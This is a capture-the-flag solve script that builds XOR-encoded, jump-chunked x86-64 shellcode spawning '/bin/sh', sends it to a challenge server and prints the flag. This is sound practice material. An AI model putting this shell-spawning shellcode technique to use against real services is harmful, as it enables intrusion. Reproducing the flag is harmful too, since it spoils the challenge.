from pwn import *

bin = './shellcrunch'
elf = context.binary = ELF(bin)

#p = process(bin)
p = remote('chal.competitivecyber.club', 3004)

#Xor encrypt it so it can be decrypted
def xor_bytes(buffer, length):
    new_buffer = list(buffer)
    for i in range(0, length - 1, 4):
        new_buffer[i] = new_buffer[i] ^ new_buffer[i + 1]
    return bytes(new_buffer)

#starting at 2, every 12 bytes the first 4 are trash - 6 bytes at each level
shellcode = asm('''
    jmp $+6
    nop
    nop
    nop
    ret
    mov al, 0x20 #2 bytes
    xor al, 0x48 #2 bytes
    nop
    nop

    jmp $+6
    nop
    nop
    nop
    ret
    shl rax, 8 #4 bytes
    mov al, 0x33 #2 bytes

    jmp $+6
    nop
    nop
    nop
    ret
    xor al, 0x40 #2 bytes
    shl rax, 8 #4 bytes

    jmp $+6
    nop
    nop
    nop
    ret
    mov al, 0x0F #2 bytes
    xor al, 0x20 #2 bytes
    nop
    nop

    jmp $+6
    nop
    nop
    nop
    ret
    shl rax, 8 #4 bytes
    mov al, 0x2E #2 bytes

    jmp $+6
    nop
    nop
    nop
    ret
    xor al, 0x40 #2 bytes
    shl rax, 8 #4 bytes

    jmp $+6
    nop
    nop
    nop
    ret
    mov al, 0x29 #2 bytes
    xor al, 0x40 #2 bytes
    nop
    nop

    jmp $+6
    nop
    nop
    nop
    ret
    shl rax, 8 #4 bytes
    mov al, 0x20 #2 bytes    

    jmp $+6
    nop
    nop
    nop
    ret
    xor al, 0x42 #2 bytes
    shl rax, 8 #4 bytes

    jmp $+6
    nop
    nop
    nop
    ret
    mov al, 0x0F #2 bytes
    xor al, 0x20 #2 bytes
    push rax
    nop

    jmp $+6
    nop
    nop
    nop
    ret
    xor rsi, rsi
    xor rdx, rdx

    jmp $+6
    nop
    nop
    nop
    ret
    xor rax, rax
    mov rdi, rsp

    jmp $+6
    nop
    nop
    nop
    ret
    xor al, 0x1b
    xor al, 0x20
    syscall
''')


length = len(shellcode)
log.info(f'Length {length}')
payload = (xor_bytes(shellcode, length))
p.sendlineafter(b'Enter shellcode:', (payload))
p.interactive()
#pctf{x0r_fu_1s_str0ng}